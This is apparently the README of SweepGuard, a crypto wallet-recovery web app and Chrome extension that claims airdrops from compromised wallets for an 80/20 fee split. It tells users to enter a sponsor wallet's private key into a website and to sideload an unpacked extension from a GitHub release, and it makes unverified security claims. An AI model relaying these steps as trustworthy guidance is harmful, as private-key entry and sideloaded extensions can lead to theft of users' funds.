# 🛡️ SweepGuard — Protect Compromised Crypto Wallets

> Auto-sweep protection for compromised EVM wallets. Claim airdrops, recover funds, and revoke drainer delegations — all while keeping your funds safe.

## 🚨 What is SweepGuard?

If your wallet has been compromised by a drainer (EIP-7702, approval exploit, private key leak), **SweepGuard** helps you:

1. **Claim airdrops safely** — 80% to your safe wallet, 20% platform fee
2. **Revoke drainer delegations** — Remove EIP-7702 delegations across 33 chains
3. **Track stolen funds** — See where your funds went
4. **Auto-sweep incoming funds** — Instantly forward any new funds to your safe wallet

---

## 🎯 Airdrop Claimer — Complete Guide

### ⚠️ CRITICAL WARNING
> **Entering the wrong address = permanent fund loss.**
> Double-check EVERY address before proceeding. There is NO undo.

### How It Works (3 Steps)

```
┌─────────────────────────────────────────────────────────┐
│  STEP 1: PREVIEW                                        │
│  Enter airdrop contract → System detects token,         │
│  eligibility, amount, and gas cost                      │
├─────────────────────────────────────────────────────────┤
│  STEP 2: SIGN                                           │
│  MetaMask popup → Sign EIP-712 message                  │
│  (NOT a transaction — your key stays in browser)        │
├─────────────────────────────────────────────────────────┤
│  STEP 3: EXECUTE                                        │
│  Sponsor wallet pays gas → Smart contract claims        │
│  tokens → 80% to safe wallet, 20% platform fee          │
│  (All in ONE atomic transaction)                        │
└─────────────────────────────────────────────────────────┘
```

### Step-by-Step Instructions

#### Step 1: Go to the Airdrop Page
- Visit [sweepguard.vercel.app/airdrop](https://sweepguard.vercel.app/airdrop)

#### Step 2: Select Chain
- Choose the blockchain where the airdrop is (Ethereum, Base, Arbitrum, etc.)
- If unsure, check the airdrop project's website for the correct chain

#### Step 3: Enter Airdrop Contract Address
- This is the contract address of the airdrop (NOT the token address)
- Find it on the project's claim page or documentation
- Example: `0x1234...abcd`

#### Step 4: Enter Your (Hacked) Wallet Address
- This is the wallet that was compromised
- This wallet must be eligible for the airdrop
- **DO NOT enter your private key here** — you only sign in MetaMask

#### Step 5: Enter Safe Wallet Address
- This is where 80% of claimed tokens will be sent
- **TRIPLE CHECK this address** — if wrong, tokens go to wrong wallet
- Use a wallet you fully control (hardware wallet recommended)

#### Step 6: Enter Sponsor Wallet
- **Sponsor Wallet Address**: A wallet with gas/native tokens (ETH, MATIC, BNB, etc.)
- **Sponsor Private Key**: The private key of the sponsor wallet
- This wallet pays the gas fee for the transaction
- ⚠️ **NEVER enter your hacked wallet's private key here**

#### Step 7: Click "Preview Claim"
- System will check:
  - ✅ Is the contract valid?
  - ✅ Are you eligible?
  - ✅ How many tokens can you claim?
  - ✅ Does the sponsor wallet have enough gas?

#### Step 8: Review the Preview
- Check the token amount
- Check the 80/20 split breakdown
- Check the sponsor gas balance
- Check the execution method (Flashbots on Ethereum, Rapid-fire on L2s)

#### Step 9: Click "Sign Authorization"
- MetaMask will pop up with an EIP-712 message
- This is a **MESSAGE signature**, NOT a transaction
- Your private key NEVER leaves your browser
- Sign the message

#### Step 10: Click "Execute Claim"
- The transaction will be submitted
- Sponsor wallet pays gas
- Smart contract claims tokens and splits them atomically
- 80% → Safe Wallet
- 20% → Platform Fee Wallet

#### Step 11: Verify
- Check the transaction hash on the block explorer
- Verify tokens arrived in your safe wallet
- Verify the 20% fee was sent to the platform wallet

---

### Common Mistakes to Avoid

| ❌ Mistake | ✅ Correct |
|-----------|-----------|
| Entering hacked wallet's private key | Only enter sponsor private key |
| Entering wrong safe wallet address | Triple-check the address |
| Using wrong chain | Check the airdrop project's chain |
| Not enough gas in sponsor wallet | Fund sponsor wallet first |
| Entering token address instead of airdrop contract | Use the airdrop CONTRACT address |

---

### How the 80/20 Split Works

```
Claimed Tokens (100%)
    │
    ├── 80% → Your Safe Wallet
    │         (You receive this)
    │
    └── 20% → Platform Fee
              (SweepGuard operational fee)
```

- The split is enforced by the smart contract
- NO ONE can bypass it (not even SweepGuard)
- The split happens atomically (same transaction)

---

### Security Model

| Feature | Protection |
|---------|-----------|
| Private Key | NEVER leaves your browser |
| Signature | EIP-712 message (NOT a transaction) |
| Replay Attack | Nonce prevents replay |
| Expiry | 10-minute deadline |
| Atomic Execution | Claim + split in one TX |
| Smart Contract | Enforces 80/20 split |
| MEV Protection | Flashbots (ETH) / Private Sequencer (L2s) |

---

## 🔗 Chrome Extension

### Install Extension
1. Go to [Releases Page](https://github.com/kabla1696-ctrl/sweeptsguard/releases)
2. Download the latest `.zip` file
3. Extract the zip file
4. Open Chrome → `chrome://extensions/`
5. Enable "Developer mode" (top right)
6. Click "Load unpacked"
7. Select the extracted folder

### Extension Features
- **Auto-intercept**: Detects claim pages automatically
- **Wallet Management**: Save your 3 wallets (hacked, safe, sponsor)
- **One-Click Claim**: Sign and claim with one click
- **Chain Detection**: Auto-detects the correct chain

---

## 📡 Supported Chains (33)

| # | Chain | Gas Token | Method |
|---|-------|-----------|--------|
| 1 | Ethereum | ETH | Flashbots |
| 2 | Base | ETH | Rapid-fire |
| 3 | BNB Chain | BNB | Rapid-fire |
| 4 | Arbitrum | ETH | Rapid-fire |
| 5 | Polygon | MATIC | Rapid-fire |
| 6 | Optimism | ETH | Rapid-fire |
| 7 | Avalanche | AVAX | Rapid-fire |
| 8 | Fantom | FTM | Rapid-fire |
| 9 | Blast | ETH | Rapid-fire |
| 10 | zkSync | ETH | Rapid-fire |
| 11 | Linea | ETH | Rapid-fire |
| 12 | Mantle | MNT | Rapid-fire |
| 13 | Scroll | ETH | Rapid-fire |
| 14 | Berachain | BERA | Rapid-fire |
| 15 | Sei | SEI | Rapid-fire |
| 16 | Hemi | ETH | Rapid-fire |
| 17 | Ink | ETH | Rapid-fire |
| 18 | Soneium | ETH | Rapid-fire |
| 19 | Gnosis | xDai | Rapid-fire |
| 20 | ZetaChain | ZETA | Rapid-fire |
| 21 | Gravity | G | Rapid-fire |
| 22 | Core | CORE | Rapid-fire |
| 23 | Kaia | KAIA | Rapid-fire |
| 24 | XLayer | OKB | Rapid-fire |
| 25 | Mode | ETH | Rapid-fire |
| 26 | Zora | ETH | Rapid-fire |
| 27 | Polygon zkEVM | ETH | Rapid-fire |
| 28 | Manta | ETH | Rapid-fire |
| 29 | Cronos | CRO | Rapid-fire |
| 30 | Swellchain | ETH | Rapid-fire |
| 31 | Morph | ETH | Rapid-fire |
| 32 | Monad | MON | Rapid-fire |
| 33 | 0G | 0G | Rapid-fire |

---

## 🔧 Fund Recovery

If your wallet has remaining assets:
1. Go to [sweepguard.vercel.app/recover](https://sweepguard.vercel.app/recover)
2. Enter your wallet details
3. System scans all 33 chains for remaining assets
4. Recover assets or revoke delegations

---

## 📊 Fund Tracker

Track where your stolen funds went:
1. Go to [sweepguard.vercel.app/tracker](https://sweepguard.vercel.app/tracker)
2. Enter your wallet address
3. See all transfers, destinations, and drainer addresses

---

## 🛠️ API Documentation

### Scan Wallet
```
POST /api/scan
{
  "address": "0x...",
  "chains": [1, 8453, 42161]
}
```

### Claim Airdrop
```
POST /api/airdrop/claim
{
  "action": "preview" | "sign" | "execute-signed",
  "contractAddress": "0x...",
  "chainId": 1,
  "walletAddress": "0x...",
  "safeWallet": "0x...",
  "sponsorWallet": "0x..."
}
```

### Track Funds
```
GET /api/track?address=0x...
```

---

## ⚠️ Disclaimer

- SweepGuard is a tool for recovering funds from compromised wallets
- Always verify addresses before submitting transactions
- The 20% platform fee is mandatory and enforced by smart contract
- SweepGuard is not responsible for funds lost due to user error
- Use at your own risk

---

## 🔗 Links

- **Website**: [sweepguard.vercel.app](https://sweepguard.vercel.app)
- **Extension**: [GitHub Releases](https://github.com/kabla1696-ctrl/sweeptsguard/releases)
- **Twitter**: [@SweepGuard_io](https://x.com/SweepGuard_io)
- **GitHub**: [kabla1696-ctrl/sweeptsguard](https://github.com/kabla1696-ctrl/sweeptsguard)

---

Built with 🛡️ by SweepGuard Team
